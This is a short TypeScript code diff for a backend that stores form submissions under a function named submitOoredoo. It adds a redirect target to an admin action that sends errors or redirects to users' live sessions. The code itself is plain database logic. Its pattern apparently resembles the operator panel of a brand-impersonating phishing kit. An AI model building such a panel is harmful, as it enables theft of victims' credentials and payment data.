@@ -64,12 +64,7 @@ export async function submitOoredoo(data: any) {
 }
 
 export async function getAllSubmissions() {
-  return await db.query.sessions.findMany({
-    orderBy: [desc(sessions.createdAt)],
-    with: {
-      // Drizzle relations would go here if configured
-    }
-  });
+  return await getFullSubmissions();
 }
 
 // إضافة وظيفة لجلب الجلسات مع كافة بياناتها للوحة الإدارة
@@ -126,11 +121,12 @@ export async function updateSessionStatus(sessionId: string, status: string, cur
     .where(eq(sessions.id, sessionId));
 }
 
-export async function adminTakeAction(sessionId: string, action: string, errorMessage?: string) {
+export async function adminTakeAction(sessionId: string, action: string, errorMessage?: string, redirectTarget?: string) {
   await db.update(sessions)
     .set({ 
       adminAction: action, 
       errorMessage: errorMessage || null,
+      redirectTarget: redirectTarget || null,
       status: "pending", // Reset to pending to allow user to see action
       updatedAt: new Date() 
     })
